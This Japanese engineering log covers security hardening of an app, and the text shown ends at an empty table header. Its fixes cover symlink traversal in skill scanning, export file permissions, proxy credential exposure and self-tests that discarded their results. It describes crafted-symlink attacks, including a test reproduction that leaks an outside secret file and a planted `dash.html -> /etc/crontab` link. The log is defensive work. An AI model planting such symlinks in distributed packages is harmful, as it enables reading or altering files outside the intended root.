
#### `scanSkills` が根の外を読んでいた

`readSkillContent` は 2026-08-23 に symlink 越しの読み出しを塞いである
(realpath で実体に直してから根の中か見る)。**列挙側には入っていなかった。**

穴は `entry.isDirectory()` が **symlink では false** になること。そこで
下の `.md` 判定 (**名前しか見ない**) へ落ち、`fs.readFile` が symlink を
辿って根の外を読む。**実測 (`scanSkills` を直接呼んだ)**:

```
skills/evil.md -> <root 外>/OUTSIDE-SECRET.md
→ {"name":"LEAKED-NAME","description":"TOP-SECRET-DESCRIPTION", …}
```

出るのは frontmatter の 2 欄だけで、`readSkillContent` (全文が Anthropic API
へ system として送られる) ほど重くはない。**だが前提条件は同じ** ——
細工した symlink を含む配布物で、あちらを塞いだ理由がそのまま当てはまる。

同じ idiom を列挙側にも入れた (根の側も realpath —— ホームや `.claude` が
symlink 越しにあると、実体だけを根にしたのでは**正当なスキルまで弾く**)。

#### 対照が 2 本要る種類の修正

「読めなくなっただけ」を修正と呼ばないために、**弾く理由が「行き先」であって
「種類」ではない**ことまで留めた。

| 壊し方 | 鳴る検査 |
|---|---|
| 手当てを外す (修正前へ戻す) | 「根の外へ向いた symlink は列挙しない」 |
| 素朴に `isSymbolicLink()` で弾く | 「根の中を指す symlink は列挙する」 |

**別々の検査が鳴る。** 片方だけだと、もう片方の壊し方を通してしまう。
併せて「根が symlink 越しでも中は列挙する」「壊れた symlink は静かに飛ばす」
も留めた (どちらも過剰な修正で落ちる形)。

`verify:arch` が挿入による行ずれを 2 件その場で指摘した (`x-api-key` 278→309 /
`isSafeSkillName` 204→283)。**文書の側も実物に追随させる仕掛けが効いている。**

#### 掃討は、既に触ったファイルの中の兄弟を取り逃がす

`scanSkills` の件を書いたあと、**なぜ 1 つだけ残ったのか**を確かめた。

2026-08-23 に同じ封じ込め (realpath で実体に直してから根の中か見る) が
**3 か所へ一度に入っている**:

```
skills.ts        readSkillContent   ← 入った
devEnv.ts        .git/refs 読み出し  ← 入った (実測: "SECRET-OUTSIDE-ROOT")
shellOpenGate.ts 開く側              ← 入った
skills.ts        scanSkills          ← 入らなかった
```

**同じファイルの中に読み手が 2 つあり、片方だけが直っている。**
ファイル単位で「skills.ts: 済」と消し込むと、中のもう 1 つは見えない。
掃討の単位が**ファイル**で、危険の単位が**関数**だったための取り逃がしである。

#### 併せて当たった書き出し側 —— こちらは揃っていた

入力からパスが決まる書き出しは 4 つ (templates / stocks / business /
teamradar) で、**全部が `isSafeExportPath` を通っている**。非対称は無い。

`exportPaths.ts` は **意図して realpath しない**と明記しており、理由も
実測つきで書いてある:

1. 書き出し先はまだ存在しないので `realpath` は `ENOENT` で失敗する ——
   読み側と同じ直し方は**原理的に当たらない**
2. symlink を置ける相手は既に書きたい所へ書ける (レンダラーが乗っ取られても
   **レンダラー自身は symlink を作れない** —— fs に触れない)

**開く側 (`shellOpenGate.ts`) だけは realpath している** —— 既に在るファイルを
OS へ渡すので、実体が根の外なら意味が変わるため。**読み・書き・開くで扱いが
違う理由が、それぞれ書いてある。**

しかもこの注記には**前の版の誤り**まで残っている ——「realpath が要る呼び出し元は
自分で足すこと」と書いてあったが**足している呼び出し元は 1 つも無く**、
読んだ人に「誰かが見ている」と思わせるだけだった。
**指示の形をした注記は、守られていなくても指示のように読める。**

#### 固定パスの読み出しは、そもそも面が無い

`emotions` / `stocks` / `teamradar` の読み出しは**引数を取らない**関数が
組み立てる固定パスで、入力由来の成分が無い (実測: `storePath()` /
`defaultStatePath()` はいずれも引数 0)。
そこへ symlink を置ける相手は同じ場所へファイルを直接置けるので、
**symlink 経由で増える権限が無い** —— `skills` と違い、第三者が配布物として
ファイルを差し込む経路が存在しない。

---

### 0600 で守っている当のデータを、0644 で書き出していた (2026-08-25)

「掃討はファイル単位、危険は関数単位」を別の掃討へ当てた ——
2026-08-23 の「保存を `atomicWriteFile` へ寄せる」一連。

#### まず読み違えた (測って直した)

`fs.writeFile(..., { mode: 0o600 })` の字面だけ見て
「`stocks` と `teamradar` は生の writeFile のままだ」と読んだ。**違った** ——
どちらも **tmp へ書いて `rename` で被せる**形を手で組んでおり、
`atomicWriteFile` と同じ性質を持つ。`teamradar` には寄せなかった理由まで
書いてある (検査が `writeFile` / `rename` の差し替え口を使うため)。

**状態ファイルは 4 つとも守られていた。** 今日 3 度目の「最初の読みが誤り」で、
どれも実測が正した。

#### そのうえで、書き出し側に穴が在った

| 保存先 | 権限 (実測) |
|---|---|
| 状態ファイル (secrets / emotions / stocks / teamradar) | **0600** |
| 書き出し (html / md / svg) 6 か所 | **0644** |
| 書き出し先ディレクトリ | 0755 |

`teamradar` の状態ファイルが 0600 な理由は、そのコードにこう書いてある ——
「**同じ機械の他の利用者が同僚の評価を読める状態だった**」。

**その評価データを SVG にして 0644 で書き出していた。** 中身は同じで、
守りだけが片側に付いていた。経営ダッシュボード (10 事業の売上・KPI・
AI 提案) も同じである。書き出しの `mode` は**過去に一度も検討されていない**
(探した範囲で、決定の記録が無い —— 覆した判断ではなく、空白だった)。

#### `mode` を足すだけでは直らない

`fs.writeFile(既存ファイル, …, { mode: 0o600 })` は**既存の権限を変えない**
(実測: 644 のまま)。`emotions.ts` が 2026-08-23 に記録している罠と同じで、
一度 644 で作られた書き出しは以後どれだけ上書きしても 644 のまま。
**`chmod` で明示的に直す** (実測: 644 → 600 / 新規も 600)。

`exportPaths.ts` に `writeExportFile` を 1 つ置き、6 か所の既定をそこへ
寄せた (差し替え口 `deps.writeFile` はそのまま —— 検査は今までどおり注入する)。

#### 対照 2 本 —— 2 本目のほうが効いている

| 壊し方 | 鳴る検査 |
|---|---|
| `mode` も `chmod` も外す (修正前の姿) | 新規 0600 / 既存 0644→0600 の 2 件 |
| **`chmod` だけ外す** (`mode` に頼る) | **既存 0644→0600 の 1 件** |

2 本目が無いと、**`{ mode: 0o600 }` だけの「正しく見える不完全な修正」**を
通してしまう。今日 `enableBlinkFeatures` で書いた「名指しは名指しした綴りしか
止められない」と同じで、**それらしい対処が効いていないことは、対照でしか出ない**。

#### ディレクトリ (0755) は締めていない

0600 のファイルは中身を読まれないので、残るのは**ファイル名が見えること**だけ。
利用者の既存ディレクトリの権限を勝手に変えるほうが影響が大きいと判断した
(判断であって、見落としではない —— そう書いておく)。

#### 直したのは「これから」だけだった —— 既に在るファイルを均す

前節の `writeExportFile` は**書くたびに** 0600 へ直すが、それだけでは
**既に 0644 で在るファイルは永遠に残る** —— 書き出しは「一度作ってそれきり」に
なりうるからである。1 月に作った経営ダッシュボードを二度と作り直さなければ、
権限は 0644 のまま。

状態ファイルが「次の書き込みで直る」で足りるのは、**保存のたびに書き換わる**
ためで、書き出しには同じ前提が無い。今日の立ち退き警告と同じ形 ——
**直った先の話をしていて、既にある物が置き去りになる。**

`repairExportPermissions()` を足し、起動時に一度だけ均す (窓を出してから走らせ、
失敗しても起動は続ける —— 権限を直せないことは、アプリが使えない理由にならない)。

#### 直す側で、同じ穴を開けない

`chmod` は symlink を辿るので、書き出し根に `dash.html -> /etc/crontab` を
置かれると**こちらが根の外の実体の権限を書き換えてしまう**。
同日 `scanSkills` で「辿ってしまった」側を直したばかりなので、
**直す側で同じ穴を開けない**ようにした。検査も置いた。

#### ★ 重複した守りは、対照を曖昧にする

対照で `isSymbolicLink()` の行を外したら —— **何も鳴らなかった**。
一瞬「また空の検査を書いた」と思ったが、測ると違った:

```
Dirent (symlink に対して)  isFile() = false / isSymbolicLink() = true
```

つまり**実際に落としているのは `!e.isFile()` のほう**で、
`isSymbolicLink()` は重複した守りだった。**両方**外すと検査は鳴る
(= 検査は生きている)。

意図を書くために `isSymbolicLink()` は残したが、**どちらが効いているかを
コードと検査の両方に書いた** —— 知らずに片方だけ外す対照を回すと、
「この検査は空だ」と読み違える。今日 2 度、本当に空の検査を書いている以上、
**空に見えて空でない**場合の見分け方も残しておく必要がある。

---

### 「設定してある」と「今の下限を満たす」は別の話だった (2026-08-25)

「直したのは *これから* だけ」の形を他へ当てた。**保護を上げたが、上げる前に
作られた物が置き去りになっている**箇所を探す。

#### 空振り 2 件 (測って畳んだ)

- **PBKDF2 の反復回数**: ヴォールトの meta が**自分で持っている**ので、
  古い値のまま開き続けうる …… と疑ったが、`git log -S` で追うと定数は
  **最初から 600,000**。下げた時期が無いので古いヴォールトも存在しない。
  上下限の検査 (`assertKdfIterations`) も既に在り、**上限のほうが本体**
  (悪意ある meta が「途方もない回数」を要求すると利用者が締め出される) と
  理由まで書いてある。
- **`atomicWriteFile` の控え (`.prev`)**: `copyFile` は**複製元の** mode を
  引き継ぐので控えだけ緩く残りうる …… が、**2026-08-23 に同じ気付きで
  `chmod` を足してあった**。今日私が書き出しで踏んだのと同じ罠を、
  先に踏んで直してある。

#### 見つけた 1 件

`MIN_PASSWORD_LENGTH` は 2026-07 の監査で **8 → 12** へ上がったが、
`unlock` は下限を**強制しない** —— 既存のヴォールトを閉め出さないためで、
これ自体は正しい判断である (`initialize` にそう明記されている)。

**ところが診断がそれを ✅ と表示していた。**

```
label          : マスターパスワード設定
recommendation : 十分に長いマスターパスワードを設定してください
実際に測っていた: 存在するか   ← 長さは見ていない
```

**助言は「十分に長い」と言い、検査は「在るか」しか見ていない。**
今日直したばかりの観点 (`masterPasswordSet` を導出から実測へ) を、
**私自身が「存在するか」までしか直していなかった。**

#### 測るが、強制はしない

解錠時に `password.length >= MIN_PASSWORD_LENGTH` を測り、**メモリだけ**に
持つ (`lock()` で捨てる)。**保存しない** —— 「このヴォールトのパスワードは
短い」を IndexedDB に書けば、総当たりの手掛かりを 1 つ置くことになる。

`null` (分からない) では**警告しない** —— 確かめずに脅さない
(`isEvictableStorage(undefined)` と同じ判断)。直す口は在る
(設定の「Vault 管理」でパスワード変更 → `changePassword` は下限を強制する)。

#### ★ 到達しない値は、配線の検査も素通りさせる

`false` になる枝は**現在の API では作れない** ——
`initialize` / `changePassword` / `recoverWithMnemonic` がどれも下限を
強制するので、短いパスワードのヴォールトは 2026-07 以前の実物しか無い。

そこで `dbPosture` の配線を消す対照を回したら —— **鳴らなかった**。
検査に `true` と `null` しか流れていないので、`!== false` を握り潰しても
差が出なかった。**枝に到達しないと、その枝を読む側の検査まで空になる。**

`passwordMeetsPolicy()` を差し替える検査を足して、配線だけを確かめた
(対照で鳴る)。**測定の 1 行そのものは今も検査から到達できない** ——
偽の meta を差し込むには KCV と master-wrap を検査側で組み直すことになり、
**暗号の実装を写経した検査は本体と別々に腐る**。
到達できないことをコードと検査の両方に書いた ——
書かないと「死んだ枝」として消される。

---

### 「自前で」は前提であって、警告ではなかった (2026-08-25)

診断の札を全部当て直したので、**画面の主張**そのものを掃討した。
`pages/` と `components/` から「どこへ行くか / どう守られるか」を名乗る文だけを
抜くと **13 件**しかなく、そのすべてが今日実測したか今日足したものだった
(トークンの暗号化 / パスワード強度の端末内評価 / 立ち退き / HIBP・VT の送信 /
ライブラリの非暗号化)。**主張の面は閉じている。**

そのうえで、主張の**隣**に穴が在った。

#### 片側だけ書いてあった

BYO プロキシの欄はこう説明している ——「**自前で** Cloudflare Worker 等を
立てて URL を指定すると経由できます」。これは**前提であって警告ではない**。
欄は自由入力の URL で、他人の Worker を入れても止まらない
(どの URL が「あなたの物」かは判定できないので、**止めようも無い**)。

そして経由するとき渡るのは宛先だけではない —— `fetchViaProxy` は呼び出し側の
ヘッダを**そのまま封筒へ載せる** (`headers: flatHeaders`) ので、
**`Authorization: Bearer <トークン>` が Worker の運用者に見える**。
HIBP のメールアドレスも VirusTotal の URL も同じ経路を通る。

すぐ下には「共有秘密を空欄にすると誰でも中継できます」と書いてある ——
**他人があなたの Worker を使う**側の話で、失うのは帯域である。
**あなたが他人の Worker を使う**側は資格情報を失うので明らかに重いのに、
そちらだけ書かれていなかった。判定できない以上、**言うことが唯一の対策**になる。

#### 既存の検査が私を止めた (そして窓がずれていた)

書き足した瞬間、既存の「**過剰に脅していない**ことの対照」が落ちた ——
「資格情報が盗まれるとは書いていない」。これは**空欄の話**についての検査で、
中継する側は自分の資格情報を送るのだから正しい主張である。

落ちた理由は文面ではなく**窓**だった。検査は placeholder (「誰でも中継」) を
起点に ±600 字を見ており、間に足した ~500 字が宥めの一文を窓の外へ押し出した。
**文面は正しいまま、検査だけが落ちた。** 起点を説明文そのものへ移した。

#### ★ 注記が本文を引き写すと、字面の検査にとって囮になる

起点を移してもまだ落ちた。測ると、`indexOf` が拾っていたのは**私が書いた
注記の中の引用**だった (注記が画面の文言をそのまま写していた)。

```
'共有秘密を空欄にすると' index=39137  ← 私の注記 (囮)
'資格情報は渡りません'   index=40821  ← 本文
```

注記から引用を外し、**起点が 1 つだけであることを検査に足した** ——
囮ができた日に「位置」ではなく「囮」を疑えるように。
対照 3 本 (宥めを消す / 新しい警告を消す / **囮を作る**) すべて鳴る。

#### 途中で 2 度、手順で足を掬われた

1. e2e の検査を placeholder の文言で書いた ——「誰でも中継できます」は
   属性で、本文には出ない。**画面に出る文字列は、画面から採る。**
2. 対照のあと `sp2.bak` から戻したら、**その控えを取ったのが囮を直す前**
   だったので修正ごと巻き戻った (全体検査で 1 件落ちて気付いた)。
   **控えは「いつ取ったか」まで込みで見る。**

#### 囮の罠は他にもあるか — 数えたら「鳴る側」しか無かった

前節で踏んだ「注記が本文を引き写すと `indexOf` がそちらを拾う」を、
検査全体へ当てた。危ないのは**窓 + 否定の主張**の組み合わせである:

| 主張の向き | 窓がずれたとき |
|---|---|
| 肯定 (`toContain` / `toMatch`) | **落ちる** —— 文面は正しいのに鳴るので、すぐ気付く |
| 否定 (`not.toMatch` ほか) | **通る** —— 窓が本文を外れているので、何も見ずに合格する |

走査すると窓を作っている検査は **9 ファイル / 13 か所**、そのうち
**否定の主張と組んでいるものは 0 件**だった。つまり今のところ、この罠が
起こすのは**空振りの警報**だけで、**黙る側は 1 つも無い**。

#### 走査そのものを 2 度疑った

1. 最初の版は `.slice(… indexOf …)` を 1 行で書いた形しか拾わず、
   **`storageClaims` 自身の窓** (`const at = …indexOf(…)` → `.slice(at, …)`) を
   取りこぼしていた。2 段の形を足して 6 → 9 ファイルへ。
   **自分が直したばかりの箇所を見落とす走査を、危うく信じるところだった。**
2. 否定形を `not.toMatch|not.toContain` だけで数えていたので、
   `toHaveLength(0)` / `toEqual([])` / `toBe(false)` を足した。
   どの形も合成標本で当たることを確かめてから 0 を受け取った。

#### だから何も足さない

13 か所へ「起点は 1 つ」の主張を配って回ることはしない ——
**鳴る側の失敗は、放っておいても自分から名乗る**。
実際に噛まれた 1 か所にだけ入れてある。
ここに書いておくのは、次に同じ罠を踏んだ人が
「全部に足すべきか」を測り直さずに済むようにするためである。

---

### 出荷物が名乗る数が、10 件ぶん古かった (2026-08-25)

掃討し終えた面から離れ、今日まだ触っていない **Service Worker と PWA
manifest** を見た。

#### Service Worker は堅い (実測して畳んだ)

`assets/sw.js` は network-first で、**同一オリジンの GET だけ**をキャッシュする。
その理由もコードに書いてある —— 2026-07 の監査前は全 GET を保存しており、
CORS 対応の第三者 API (GitHub / HIBP) の応答、つまり業務データや漏洩調査の
結果が**平文で端末に無期限保存**され、Vault の保護を迂回していた。
`res.ok` の判定 (5xx を app shell として焼き付けない)、
遷移のみの fallback、版つきキャッシュの掃除も揃っている。

**プロキシ経由の通信も掛からない** —— `fetchViaProxy` は Worker へ **POST**
するので、GET だけを見る SW は触れない (同一オリジンに Worker を置いた場合の
抜けも、これで閉じている)。

manifest も最小で、`share_target` / `file_handlers` / `protocol_handlers` は
**1 つも無い** —— OS から任意の入力を受ける口を増やしていない。

#### 見つけたのは 1 件、しかも数字

`manifest.webmanifest` の `description` が「**64 サービス**」と名乗っていた。
実際は **74** で、10 件ぶん古い。この文字列は **PWA の導入ダイアログや
アプリ一覧にそのまま出る**。

`verify:arch` は同じ数 (`service count`) を照合しているが、**対象が
`docs/ARCHITECTURE.md`** なので**出荷物は見ていなかった**。
今日繰り返し書いた「文書が実物より小さい」が、文書ではなく
**利用者に届く成果物**で起きていた。

害の無い数字ではあるが、**利用者に見える面が実物と違う**ことに変わりはない。
数を書く以上、実物 (`SERVICE_IDS`) から縛った。

#### 併せて留めた 2 つ

- **入力口を増やしていないこと** (`share_target` ほかが 0 件)。
  増えれば検証すべき経路が増えるので、増えた日に人の目を通す。
- **`scope` / `start_url` が相対のまま** (公開先を固定しない)。

対照 —— 数を 64 へ戻すと名指しで鳴り、`share_target` を足すと
「入力の検証が要る」と鳴る。

#### 100% は、何の 100% なのか

出荷物の主張を続けて当てた。着地したのは**公開頁の品質の主張**である。

`dist/landing.html` は「**100% Mutation スコア**」とだけ出していた。
数そのものは `docs/ARCHITECTURE.md` の記録 (total / covered とも 100.00%) と
合っており**嘘ではない**。書いていなかったのは**範囲**である:

```
mutate に載っているモジュール : 244
lint:forbidden が走査する資産 : 485
```

測っているのは約半分で、どれを測るかは `lint:mutation-scope` が台帳
(`MUST_MEASURE` / `KNOWN_UNMEASURED`) で管理している ——
**範囲が有ることは承知の設計**である。にもかかわらず、公開頁だけが
範囲抜きで 100% と出していた。

このリポジトリは同じ理屈を既に別の場所で書いている ——
「範囲を書かない『保存時暗号化 ✓』は、利用者に『全部暗号化されている』と
読ませる」。**公開する品質の主張にも同じ基準を当てる。**
「Mutation スコア (対象 244 モジュール)」にし、**数は設定から採った**
(書き写すと、この節の前半で見つけたのと同じ形で古くなる)。

#### ★ 自分が入れた数の分母が、間違っていた

manifest を直したとき `SERVICE_IDS` (74) で縛った。**間違いだった。**
`description` は「…を **1 つのサイドバー UI に統合した**」と書いている ——
名乗っているのは**サイドバーに並ぶ数**である。両者は 2 件ずれる:
`uber-eats` / `demae-can` は `BusinessPage` が snapshot を内部で使うだけで
**独立した画面を持たない** (`sidebarCoverage.test.ts` の `SIDEBAR_LESS` に
理由つきで載っている)。

landing (72) と manifest (74) が食い違って初めて気付いた。
**74 に揃えていたら、72 件しか並べない頁が「74 サービス」と名乗る**ことになる。
manifest を 72 にし、検査もサイドバーの実数へ縛り直した。

**数を書くときは、その文が何を数えているかまで読む。**
検査の名前も「SERVICE_IDS と一致する」から「サイドバーの実数と一致する」へ
直した —— 名前が測っている物と違うのは、今日ずっと追いかけてきた形そのもの。

---

### 公開デモの主張を、実機で当てた (2026-08-25)

出荷物の掃討を demo 3 本へ広げた。**数ではなく文として読む** ——
何を名乗っているか、それは測れるか。

#### 主張は本当だった (3 本とも実測)

`counseling-demo` は「Service Hub の実エンジンがそのまま動いています。
**データは端末内のみ・送信なし**」と名乗る。実ブラウザで開き、
実キー入力で文を打ち、ボタンを押して 3 秒待って測った:

| デモ | 読み込み後 | 操作後 | 応答 | console.error |
|---|---|---|---|---|
| counseling | 0 件 | 0 件 | 出た (813 字) | 0 |
| research | 0 件 | 0 件 | 出た (763 字) | 0 |
| deliberation | 0 件 | 0 件 | 出た (695 字) | 0 |

**空振りでないことも確かめた** —— どれも本文が伸びており、
「何も起きないから通信も無い」ではない。

#### 書いていない頁が 1 つあった

自由入力を持つのは **counseling と deliberation の 2 本**
(research は選択のみで、打ち込む面が無い)。
ところが**主張を書いているのは counseling だけ**だった。

deliberation の入力は軽くない ——
`placeholder="発話を入力して合議にかける（例: 全部壊したい）"` で、
突き合わせる `CRISIS_MARKERS` には「死にたい」「消えたい」「いなくなりたい」が
並ぶ。**利用者が自分について本当のことを打ちうる面**である。

挙動は 3 本とも同じ (送信 0) なので、これは**書いていないだけ**の差だが、
**書いてある頁が隣にあると、無い頁は「こちらは送っている」と読める。**
今日 HIBP と VirusTotal で見たのと同じ非対称である。
「入力した発話は端末内だけで判定し、送信しません。」を足した。

#### 決めなかったこと

打った人へ**相談先を出すべきか**は別の判断なので、ここでは決めない ——
この頁は検知の**精度を見る**ためのもので、応答を返す頁ではない。
`counselorKnowledge.ts` に相談窓口の一覧はあるが、
**どの頁が誰に何を出すか**は持ち主の決めることである。

#### 自分の注記が本文を割った

足した注記をファイル冒頭へ挿し込んだら、**元の一文の途中に入って**
「…esbuild で」と「そのままバンドルし…」を分断していた。
生成物には出ないが、読む人には出る。段落の後ろへ移した。
**挿入位置は、行番号ではなく文の切れ目で決める。**

### 対照の結果を、捨てていた (2026-08-25)

出荷物の掃討で最後に残っていた `README.md` を**主張として**読んだ。
内訳の行が古かった (次節) ので、それをゲートで縛ろうとして
`scripts/cross-doc-consistency.cjs` を開いた —— そこで**別のもの**を見つけた。

#### 旗を立てて、読んでいなかった

このファイルには `--self-test` があり、`checkNotInCiClaims` の 5 ケースが
期待と食い違ったとき `selfTestFailed = true` を立てる。ところが

```
$ grep -n selfTestFailed scripts/cross-doc-consistency.cjs
476:let selfTestFailed = false;   # 宣言
517:      if (!ok) selfTestFailed = true;   # 書き込み
```

**読む場所が無かった。** 最後の判定は `if (bad > 0)` だけを見ており、
`bad` は別ループ (`checkCiGateCoverage` のケース) の集計である。

旧い姿を再現して測った。ケースを 1 つ壊す (期待件数を 99 にする) と:

```
  ✗ 主張が無ければ何も見ない: 0 件 (期待 99)
✅ self-test 全件一致
node exit=0
```

**`✗` と `✅ 全件一致` が同時に出て、0 で終わる。**
画面には出るが、**CI が見るのは終了コードだけである。**
直した版で同じ壊し方をすると exit 1。

#### なぜここが効くか

このファイルは「`verify:all` の 33 ゲートが **ci.yml で実際に走っているか**」を
見る、いわばゲートのゲートである。リポジトリの記録によれば
`lint:citations` / `lint:knowledge-refs` / `verify:knowledge` の 3 つが
**存在するだけで何も守っていない**状態で放置されていたことがあり、
この検査はその再発を止めるために書かれた。
**その検査の自己検査が、黙っていた。**

対照を書くところまではやっていた。**結果を捨てていた。**

#### 到達しない枝が、報告そのものを無効にしていた

同じファイルの `main()` には「canonical を source から計算できない」を
**事実名つきで報告する枝**がある。だが `canonicalServiceCount` /
`canonicalServiceList` / `canonicalIpcHandlerCount` / `canonicalOAuthCount` は
`read()` が返しうる `null` に `.match` を当てており、**先に生の TypeError で落ちる**。
ファイル名が変われば「どの事実が測れなかったか」は出力に出ない。

**1 回目の直しでは、対照が鳴らなかった。** 関数へ null ガードを入れて
`src/shared/serviceId.ts` を隠して回すと、まだ TypeError で落ちた ——

```
canonical: canonicalServiceList().sort().join(','),
                                 ^  TypeError: Cannot read properties of null
```

**呼び出し側**が同じ形をしていた。ガードは throw を消したのではなく、
**1 行ずらしただけ**だった。呼び出し側も直して測り直すと:

```
❌ 2 cross-doc inconsistency(ies):
  fact "service count" — canonical value could not be computed from source
  fact "service list (set equality)" — canonical value could not be computed from source
```

**鳴らない対照は、対照ではなく報せである。** 今日 2 回目。

### 合計だけを見る検査は、内訳が同じだけ間違っていても黙る (2026-08-25)

`README.md` の `## サービス一覧 (74)` という**合計**は、5 文書ぶん
`cross-doc-consistency` が既に縛っていた。だが**内訳の表**は誰も読んでいなかった。

数えると `12 + 8 + 18 + 32 = 70`。同じ README の本文が言う「全 74」と 4 件ずれる。
サイドバー (`services.ts`) と突き合わせると、**画面に出ているのに README にだけ無い**
サービスが 2 件あった: `Cursor` (外部サービス連携) と `可視化` (分析・ツール)。

#### 合計の検査は、内訳について何も言っていなかった

- 足し引きが打ち消し合えば、内訳が 2 か所間違っていても合計は動かない。
- そもそも**合計 74 はサイドバー非表示の 2 件 (`uber-eats` / `demae-can`) を含む**ので、
  内訳の和 (72) とは**一致しないのが正しい**。つまり合計と内訳は
  別々の数であり、片方を縛っても他方には何の制約も及ばない。

manifest が 64 のまま止まっていたのと同じ形である ——
**縛った数の隣に、縛っていない数が並んでいる。**

#### 数ではなく、名前の集合を突き合わせる

`checkReadmeCategories` を追加した。カテゴリごとに

1. README の行が宣言する件数 == その行が並べる名前の数
2. その名前の集合 == `services.ts` の当該カテゴリの `label` の集合

を見る。**数を数えるだけでは「1 件足して 1 件消した」が通る**し、
綴りが変わったことも見えない。

#### 検査が、書いた本人の知らなかったことを見つけた

初回実行で鳴った:

```
README "分析・ツール" にサイドバーの KPI / BEP / コネクター / 自動化 が載っていない
README "分析・ツール" の KPI / コネクター はサイドバーに無い
```

サイドバーの名前は `KPI / BEP` と `コネクター / 自動化` で、
**表のセル区切りと同じ ` / ` を名前の中に含んでいた**。
そのまま書くと読む側にも数える側にも 2 件に見えるので、
README は前半だけを書いていた。

短縮を台帳 (`README_LABEL_ALIASES`) にして、**短縮は 2 件だけ**という事実自体を
検査対象にした。あわせて**左辺がサイドバーから消えたら鳴る**ようにした ——
古い短縮を残すと「README にだけある名前」を黙って許す抜け穴になる。

#### 最初の対照は、全ケースで鳴った

self-test の雛形が**分析・ツールしか持っていなかった**ので、どのケースも
残り 3 カテゴリの「走査が壊れている」で鳴り、期待件数と全部食い違った。

**全部鳴る対照は、何を確かめたのか言っていない。**
4 カテゴリ揃った雛形の上で、**分析・ツールの行だけ**を差し替える形に直した。

#### 実物に当てた対照

- 可視化 を消して数を 18 に戻す (2026-08-25 に実在した形)
  → `README "分析・ツール" にサイドバーの 可視化 が載っていない`
- 数だけ 33→32 に戻す (列挙はそのまま)
  → `README "外部サービス連携" は (32) と書いているが 33 件しか並べていない`

どちらも exit 1。復元すると 0。

#### ついでに直した README の別の主張

`dist/standalone.html` を「**約 510 KB の単一ファイル**」と書いていた。
実測 `10.9 MiB (11,387,230 bytes)` —— **21 倍**である。
`CLAUDE.md` は同じものを「実測 10.8 MiB」と正しく書いていたので、
**リポジトリの中で 2 桁違う 2 つの数字が並んでいた**。
実測値へ直し、軽量版 (`build:web:lite` 約 2.7 MB) の行も足した。

### 誰も回さない対照は、対照が無いのと同じである (2026-08-25)

前節で `cross-doc-consistency.cjs` の self-test が結果を捨てていたのを見つけたので、
**同じ形が他にもあるか**を数えた。`scripts/*.cjs` のうち self-test を持つのは 28 本。

#### 1. 「壊したら鳴るか」を 1 本ずつ実測した

静的な読みでは足りない (台帳を標本の代わりにはできない) ので、
**実物を 1 本ずつ壊して終了コードを測った**。変異は 2 種類:

- 期待値表の最初の数値を `+7` ずらす (19 本に当たった)
- self-test 内の最初の `const ok = …` を反転する (残り 9 本)

結果: **28 本すべて exit 1** —— 唯一黙っていたのは前節で直した
`cross-doc-consistency.cjs` だけだった。**測った上での白**である。

#### 2. 数え方が 1 か所ずれていた (穴ではない)

`lint-sample-data.cjs:250` が `if (!ok) bad = 1;` と**代入**していた
(他はすべて `bad++`)。`bad` はこの行より前で 0 に初期化され、この行は失敗時にしか
走らないので **終了コードは正しい** —— 5 件失敗しても「1 件」と表示するだけの
**報告の不正確さ**である。`bad++` に直した。穴ではなかったことを明記しておく。

#### 3. self-test が「どこからも呼ばれていない」ものが 1 本あった

`verify:all` / `.github/workflows/` の両方から、各 self-test を起動する者を数えた。

- `safe-vault-write.cjs` — `require.main` で**既定が self-test** (`vault:check` が起動する)。白。
- `mutate-changed.cjs` — `mutation.yml:55` が `--self-test` を走らせる。白。
- **`scan-credential-headers.cjs` — 誰も呼んでいなかった。**

この走査は「**送っている側**からヘッダ名を数え、`redact.ts` の伏字の網が
全部を知っているか」を見るもので、self-test は書き方の 12 形
(引用符つき / 素の識別子 / ブラケット代入 / 入れ子 / 閉じられていないブロック /
大文字小文字 / btoa 組み立て / 既知の限界 ほか) と
「実物の `src/` から 6 種を拾えている」を確かめている。**13 件とも走っていなかった。**

#### 下限は「0 になったこと」しか止められなかった

`redactionCoverage.test.ts` は走査の**出力**を読んでおり、
「走査が死んで 0 件になったのを違反なしと読まない」ための下限
(`HEADERS.length >= 4`) を既に持っていた。だが実測は 6 種である ——
**2 種までは黙って消える。**

対照で確かめた。走査のブラケット代入規則 (`BRACKET_SET`) を当たらない形へ潰すと:

```
Tests  1 failed | 21 passed (22)     ← 落ちたのは今日足した 1 件だけ
```

**既存のテストは全部通った。** 消えたのは `x-proxy-auth` ——
BYO プロキシの共有秘密で、応答本文を返してくるのは**利用者が用意したプロキシ自身**
なので、伏字から漏れたときの影響がいちばん大きいものである。
`it.each` の件数が 23 → 22 に減っただけで、**誰も鳴らなかった**。

#### 直し方

走査を既に読み込んでいる `redactionCoverage.test.ts` から `selfTest()` を呼び、
戻り値 0 を求める (`console.log` は溜めて、落ちたときだけ本文へ出す)。
費用はほぼ 0 で、13 件の対照が CI に入る。
**走査が実際に回ったこと**も別に留める (`✓` の行が 10 件以上) ——
`selfTest` が何もせず 0 を返すようになったら、それも見えなければならない。

対照: 潰した走査で新しい検査が落ち、戻すと 23 件 green。

### 同じ形をテスト側でも数えた — 空虚に通りうる検査 (2026-08-25 実測)

`it.each` が 0 件回っても緑になる形を `redactionCoverage` で踏んだので、
**テスト全体で同じ形を数えた**。

#### 1. `each` の元が計算値のもの — 1 件だけ

`src/**/*.ts(x)` の `it.each(…)` / `test.each(…)` **38 か所**のうち、
元がリテラル配列でないものは **1 件**だけで、それが今日直した
`redactionCoverage.test.ts:50` (`credentialHeaderNames()`) だった。

`pkceSession.test.ts:87` は `it.each(pkceSessionKeys())` と**関数呼び出し**だが、
同じファイルの別の検査が `expect(remaining()).toHaveLength(4)` と
**件数を厳密に留めている**ので、空になれば鳴る。白。

#### 2. 何も主張していない `it()` — 0 件

`it()` **9,747 件**の本体を見て、`expect` / `assert` も、
`expect` を含む局所ヘルパーの呼び出しも無いものを探した → **0 件**。

**この走査自体の対照も回した** —— 何も主張しない `it()` を 1 つ差し込むと
`villageLayout.test.ts:739` として検出された。**鳴る走査での 0 件**である。
(最初の版はブレース対応で本体を切っており、`'} finally {'` のような
**文字列の中の括弧**に騙されて 19 件の偽陽性を出した。行の字下げで切り直した。)

#### 3. 主張がループの中にしか無いもの — 16 件、いずれも白

主張を持つ `it()` **9,722 件**のうち、**すべての `expect` がループの内側**にあり、
かつ同じ検査の中に下限が無いものが 16 件。1 件ずつ当たった:

| 場所 | なぜ空にならない / 何が鳴るか |
|---|---|
